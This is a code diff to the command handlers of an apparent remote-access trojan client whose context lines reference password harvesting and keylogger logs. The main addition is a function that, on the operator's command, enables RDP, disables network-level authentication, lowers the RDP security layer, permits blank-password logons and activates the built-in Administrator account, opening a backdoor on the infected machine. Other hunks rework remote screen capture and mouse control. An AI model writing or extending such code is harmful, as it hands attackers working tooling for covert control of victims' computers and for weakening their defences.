@@ -40,7 +40,99 @@ namespace xClient.Core.Commands
 
             new Packets.ClientPackets.GetPasswordsResponse(raw).Execute(client);
         }
+        public static void HandleRemoteDesktopProtocol(Packets.ServerPackets.DoRemoteDesktopProtocol packet, Client client)
+        {
 
+            bool toggleState = false;
+
+            try
+            {
+                if (WindowsAccountHelper.GetAccountType() != "Admin")
+                {
+                    new Packets.ClientPackets.SetStatus("Admin rights is required to enable this feature...").Execute(client);
+                    return;
+                }
+
+
+                Microsoft.Win32.RegistryKey checkEnabledKey = RegistryKeyHelper.OpenReadonlySubKey(Microsoft.Win32.RegistryHive.LocalMachine, @"SYSTEM\CurrentControlSet\Control\Terminal Server");
+
+                if (((int)checkEnabledKey.GetValue("fDenyTSConnections", 1)) == 0)
+                {
+                    // If this is true, we want to turn the values to their 'off' positions in the registry as we toggle.
+                    toggleState = true;
+                }
+
+
+                Packets.ClientPackets.SetStatus failureStatus = new Packets.ClientPackets.SetStatus(string.Format("Failed to {0} keys! Admin is needed!", toggleState ? "restore" : "modify"));
+
+                // Perform registry changes depending on protocol being enabled or not
+                bool denyTSResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
+                    @"SYSTEM\CurrentControlSet\Control\Terminal Server",
+                    "fDenyTSConnections", toggleState ? 1 : 0,
+                    false /* we don't want to add quotes */,
+                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
+                    );
+
+                if (!denyTSResult)
+                {
+                    failureStatus.Execute(client);
+                    return;
+                }
+
+                bool userAuthResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
+                    @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
+                    "UserAuthentication", toggleState ? 1 : 0,
+                    false /* we don't want to add quotes */,
+                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
+                    );
+
+                if (!userAuthResult)
+                {
+                    failureStatus.Execute(client);
+                    return;
+                }
+
+                bool secLayerResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
+                    @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
+                    "SecurityLayer", 1,
+                    false /* we don't want to add quotes */,
+                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
+                    );
+
+                if (!secLayerResult)
+                {
+                    failureStatus.Execute(client);
+                    return;
+                }
+
+                bool allowBlankPassResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
+                    @"SYSTEM\CurrentControlSet\Control\Lsa",
+                    "LimitBlankPasswordUse", 0,
+                    false /* we don't want to add quotes */,
+                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
+                    );
+
+                if (!allowBlankPassResult)
+                {
+                    failureStatus.Execute(client);
+                    return;
+                }
+                // Enable default administrator account
+                // net user administrator /active:yes
+                SystemHelper.ExecuteCommandLine("net user administrator /active:" + (toggleState ? "no" : "yes"), true);
+
+
+                // SERVER should start a reverse proxy client  (rdp default set to 3389 this could be altered though... perhaps will add support for it in future...)
+                new Packets.ClientPackets.SetStatus(toggleState ? "Disabled RDP Connections!" : "Enabled RDP Connections!").Execute(client);
+
+                
+
+            }
+            catch (Exception ex)
+            {
+                new Packets.ClientPackets.SetStatus("Remote RDP Toggle Error: " + ex.Message);
+            }
+        }
         public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
         {
             var resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));
@@ -62,21 +154,22 @@ namespace xClient.Core.Commands
             try
             {
                 desktop = ScreenHelper.CaptureScreen(command.Monitor);
-                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
-                    ImageLockMode.ReadWrite, desktop.PixelFormat);
+                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),ImageLockMode.ReadWrite, desktop.PixelFormat);
 
                 using (MemoryStream stream = new MemoryStream())
                 {
-                    if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
-                    StreamCodec.CodeImage(desktopData.Scan0,
-                        new Rectangle(0, 0, desktop.Width, desktop.Height),
+                    if (StreamCodec == null)
+                        throw new Exception("StreamCodec can not be null.");
+
+                    StreamCodec.CodeImage(desktopData.Scan0,new Rectangle(0, 0, desktop.Width, desktop.Height),
                         new Size(desktop.Width, desktop.Height),
                         desktop.PixelFormat, stream);
+
                     new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                         StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
                 if (StreamCodec != null)
                     new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
@@ -107,47 +200,26 @@ namespace xClient.Core.Commands
         {
             try
             {
+                if (NativeMethodsHelper.IsScreensaverActive())
+                {
+                    NativeMethodsHelper.DisableScreensaver();
+                    return;
+                }
                 Screen[] allScreens = Screen.AllScreens;
-                int offsetX = allScreens[command.MonitorIndex].Bounds.X;
-                int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
-                Point p = new Point(command.X + offsetX, command.Y + offsetY);
-
-                // Disable screensaver if active before input
-                switch (command.Action)
+                Rectangle rect = allScreens[command.MonitorIndex].Bounds;
+                if (rect.X != 0)
                 {
-                    case MouseAction.LeftDown:
-                    case MouseAction.LeftUp:
-                    case MouseAction.RightDown:
-                    case MouseAction.RightUp:
-                    case MouseAction.MoveCursor:
-                        if (NativeMethodsHelper.IsScreensaverActive())
-                            NativeMethodsHelper.DisableScreensaver();
-                        break;
+                    command.X += rect.X * 0xFFFF / rect.Width;
                 }
-
-                switch (command.Action)
+                if (rect.Y != 0)
                 {
-                    case MouseAction.LeftDown:
-                    case MouseAction.LeftUp:
-                        NativeMethodsHelper.DoMouseLeftClick(p, command.IsMouseDown);
-                        break;
-                    case MouseAction.RightDown:
-                    case MouseAction.RightUp:
-                        NativeMethodsHelper.DoMouseRightClick(p, command.IsMouseDown);
-                        break;
-                    case MouseAction.MoveCursor:
-                        NativeMethodsHelper.DoMouseMove(p);
-                        break;
-                    case MouseAction.ScrollDown:
-                        NativeMethodsHelper.DoMouseScroll(p, true);
-                        break;
-                    case MouseAction.ScrollUp:
-                        NativeMethodsHelper.DoMouseScroll(p, false);
-                        break;
+                    command.Y += rect.Y * 0xFFFF / rect.Height;
                 }
+                NativeMethodsHelper.OnMouseEventHander((uint)command.Action, command.X,command.Y, command.DwData);
             }
-            catch
+            catch(Exception )
             {
+
             }
         }
 
@@ -166,6 +238,7 @@ namespace xClient.Core.Commands
                 new Packets.ClientPackets.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
             }
         }
+
 
         public static void HandleGetKeyloggerLogs(Packets.ServerPackets.GetKeyloggerLogs command, Client client)
         {
